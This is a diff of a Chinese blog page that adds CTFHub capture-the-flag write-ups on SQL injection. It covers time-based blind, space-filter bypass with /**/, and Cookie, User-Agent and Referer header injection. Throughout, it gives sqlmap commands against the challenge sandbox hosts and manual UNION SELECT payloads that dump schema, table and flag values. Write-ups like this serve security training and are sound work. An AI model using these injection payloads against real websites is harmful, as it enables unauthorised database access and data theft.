@@ -519,21 +519,21 @@ HTTP是Hyper Text Transfer">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-07-18
+                    2020-07-19
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.1k
+                    5.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    16 分
+                    22 分
                 </div>
                 
 				
@@ -887,7 +887,162 @@ python sqlmap.py -u http://challenge-0107480d29208db9.sandbox.ctfhub.com:10080/?
 
 <span class="token comment" spellcheck="true">#获取字段信息 </span>
 python sqlmap.py -u http://challenge-0107480d29208db9.sandbox.ctfhub.com:10080/?id<span class="token operator">=</span>1 --technique T -D sqli -T flag -C flag --dump --batch --threads 10 --dbms<span class="token operator">=</span>mysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><h2 id="赞助💰"><a href="#赞助💰" class="headerlink" title="赞助💰"></a>赞助💰</h2><p>如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span> 
+<span class="token number">1</span>' 
+<span class="token number">1</span>" 
+<span class="token comment" spellcheck="true">#不管怎么样都不报错，不管对错一直显示一个固定的页面；</span>
+
+<span class="token comment" spellcheck="true">#判断注入点 </span>
+id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#页面响应延迟，判断存在时间延迟型注入 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>执行命令后会有一定时间的等待，确定为时间盲注，直接用sqlmap跑</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#查询数据库 #【security】 </span>
+python sqlmap.py -u http://challenge-54c933165918d571.sandbox.ctfhub.com:10080/?id<span class="token operator">=</span>1 --technique T --dbs --batch --threads 10 
+
+<span class="token comment" spellcheck="true">#获取数据库中的表 #【emails、referers、uagents、users】 </span>
+python sqlmap.py -u http://challenge-54c933165918d571.sandbox.ctfhub.com:10080/?id<span class="token operator">=</span>1 --technique T -D security --tables --batch --threads 10 
+
+<span class="token comment" spellcheck="true">#获取表中的字段名 #【id、username、password】 </span>
+python sqlmap.py -u http://challenge-54c933165918d571.sandbox.ctfhub.com:10080/?id<span class="token operator">=</span>1 --technique T -D security -T <span class="token function">users</span> --columns --batch --threads 10 
+
+<span class="token comment" spellcheck="true">#获取字段信息 【Dumb|Dumb、dhakkan|dumbo ...】 </span>
+python sqlmap.py -u http://challenge-54c933165918d571.sandbox.ctfhub.com:10080/?id<span class="token operator">=</span>1 --technique T -D sqli -T flag -C flag --dump --batch --threads 10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200719093505.png" alt></p>
+<p>手工时间盲注请参考：<a href="https://jwt1399.top/posts/32179.html#toc-heading-49">https://jwt1399.top/posts/32179.html#toc-heading-49</a></p>
+<h3 id="MySQL结构"><a href="#MySQL结构" class="headerlink" title="MySQL结构"></a>MySQL结构</h3><p>这题就是普通的数字型注入</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#查看页面变化，判断sql注入类别【为数字型注入】</span>
+<span class="token number">1</span>
+
+<span class="token comment" spellcheck="true">#确定字段数【字段数为2】</span>
+<span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span>  <span class="token number">1</span>
+<span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span>  <span class="token number">2</span>
+<span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span>  <span class="token number">3</span>
+
+<span class="token comment" spellcheck="true">#确定字段顺序</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>
+
+<span class="token comment" spellcheck="true">#爆数据库名【sqli】</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#爆表名【ozvcareuri,news】</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'sqli'</span>
+
+<span class="token comment" spellcheck="true">#爆列名【exvgmxaubz】</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'ozvcareuri'</span>
+
+<span class="token comment" spellcheck="true">#爆值</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>exvgmxaubz <span class="token keyword">from</span> ozvcareuri<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200719100041.png" alt></p>
+<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>这题过滤了空格，可用<code>/**/</code>绕过，或者使用sqlmap的<code>--tamper &quot;space2comment.py&quot;</code>绕过空格</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#查看页面变化，判断sql注入类别【为数字型注入】</span>
+<span class="token number">1</span>
+
+<span class="token comment" spellcheck="true">#确定字段数【字段数为2】</span>
+<span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span>  <span class="token number">1</span>  显示Hacker<span class="token punctuation">,</span>过滤空格用<span class="token comment" spellcheck="true">/**/</span>绕过
+<span class="token number">1</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">order</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">by</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span>
+<span class="token number">1</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">order</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">by</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">2</span>
+<span class="token number">1</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">order</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">by</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">3</span>
+
+<span class="token comment" spellcheck="true">#确定字段顺序</span>
+<span class="token operator">-</span><span class="token number">1</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>
+
+<span class="token comment" spellcheck="true">#爆数据库名【sqli】</span>
+<span class="token operator">-</span><span class="token number">1</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#爆表名【news,felpxwlqwt】</span>
+<span class="token operator">-</span><span class="token number">1</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">where</span><span class="token comment" spellcheck="true">/**/</span>table_schema<span class="token operator">=</span><span class="token string">'sqli'</span>
+
+<span class="token comment" spellcheck="true">#爆列名【agabwtnany】</span>
+<span class="token operator">-</span><span class="token number">1</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token comment" spellcheck="true">/**/</span><span class="token keyword">where</span><span class="token comment" spellcheck="true">/**/</span>table_name<span class="token operator">=</span><span class="token string">'felpxwlqwt'</span>
+
+<span class="token comment" spellcheck="true">#爆值</span>
+<span class="token operator">-</span><span class="token number">1</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span>agabwtnany<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>felpxwlqwt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200719102425.png" alt></p>
+<h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><blockquote>
+<p>Cookie，有时也用其复数形式 Cookies。类型为“<strong>小型文本文件</strong>”，是某些网站为了辨别用户身份，进行<a href="https://baike.baidu.com/item/Session/479100" target="_blank" rel="noopener">Session</a>跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息</p>
+</blockquote>
+<p>题目已经很明显提示是cookie注入，打开Burpsuite抓包</p>
+<p>抓包之后可以看到cookie里面有id参数，我们尝试进行注入，果然可以成功注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200719102419.png" alt></p>
+<p>后续就是修改Cookie进行普通的数字型注入就可以了</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#确定字段数【字段数为2】</span>
+Cookie: id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span>
+Cookie: id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span>
+Cookie: id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span>
+
+<span class="token comment" spellcheck="true">#确定字段顺序</span>
+Cookie: id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>
+
+<span class="token comment" spellcheck="true">#爆数据库名【sqli】</span>
+Cookie: id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#爆表名【news,ztikrnhkas】</span>
+Cookie: id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'sqli'</span>
+
+<span class="token comment" spellcheck="true">#爆列名【rcdrtihzyr】</span>
+Cookie: id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'ztikrnhkas'</span>
+
+<span class="token comment" spellcheck="true">#爆值</span>
+Cookie: id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>rcdrtihzyr <span class="token keyword">from</span> ztikrnhkas<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200719103005.png" alt></p>
+<h3 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h3><blockquote>
+<p>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统操作系统/192)及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</p>
+</blockquote>
+<p>题目已经很明显提示是User-Agent注入，打开Burpsuite抓包</p>
+<p>抓包之后可以看到id=后面跟的是User-Agent</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200719103546.png" alt></p>
+<p>我们尝试进行注入，将User-Agent修改成数字1，可以看到成功返回结果</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200719103541.png" alt></p>
+<p>后续就是修改User-Agent进行普通的数字型注入就可以了</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#确定字段数【字段数为2】</span>
+<span class="token keyword">User</span><span class="token operator">-</span>Agent: <span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span>
+<span class="token keyword">User</span><span class="token operator">-</span>Agent: <span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span>
+<span class="token keyword">User</span><span class="token operator">-</span>Agent: <span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span>
+
+<span class="token comment" spellcheck="true">#确定字段顺序</span>
+<span class="token keyword">User</span><span class="token operator">-</span>Agent: <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>
+
+<span class="token comment" spellcheck="true">#爆数据库名【sqli】</span>
+<span class="token keyword">User</span><span class="token operator">-</span>Agent: <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#爆表名【news,loldzlscdv】</span>
+<span class="token keyword">User</span><span class="token operator">-</span>Agent: <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'sqli'</span>
+
+<span class="token comment" spellcheck="true">#爆列名【vypsgberdj】</span>
+<span class="token keyword">User</span><span class="token operator">-</span>Agent: <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'loldzlscdv'</span>
+
+<span class="token comment" spellcheck="true">#爆值</span>
+<span class="token keyword">User</span><span class="token operator">-</span>Agent: <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>vypsgberdj <span class="token keyword">from</span> loldzlscdv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200719105339.png" alt></p>
+<h3 id="Refer注入"><a href="#Refer注入" class="headerlink" title="Refer注入"></a>Refer注入</h3><blockquote>
+<p>HTTP Referer是<a href="https://baike.baidu.com/item/header/688992" target="_blank" rel="noopener">header</a>的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p>
+</blockquote>
+<p>题目已经很明显提示是Referer注入，打开Burpsuite抓包</p>
+<p>根据提示添加<code>Referer=1</code>，返回包里面出现了我们想看到的数据</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200719110032.png" alt></p>
+<p>后续就是修改Referer进行普通的数字型注入就可以了</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#确定字段数【字段数为2】</span>
+Referer: <span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span>
+Referer: <span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span>
+Referer: <span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span>
+
+<span class="token comment" spellcheck="true">#确定字段顺序</span>
+Referer: <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>
+
+<span class="token comment" spellcheck="true">#爆数据库名【sqli】</span>
+Referer: <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#爆表名【news,vanhpdcmvu】</span>
+Referer: <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'sqli'</span>
+
+<span class="token comment" spellcheck="true">#爆列名【crmbodscpv】</span>
+Referer: <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'crmbodscpv'</span>
+
+<span class="token comment" spellcheck="true">#爆值</span>
+Referer: <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>crmbodscpv <span class="token keyword">from</span> vanhpdcmvu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200719105703.png" alt></p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>待更。。。</p>
+<h2 id="赞助💰"><a href="#赞助💰" class="headerlink" title="赞助💰"></a>赞助💰</h2><p>如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭</p>
 <table>
   <tbody>
      <tr>
@@ -1676,7 +1831,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">167.5k</span>&nbsp;字
+                class="white-color">169.9k</span>&nbsp;字
             
             
             
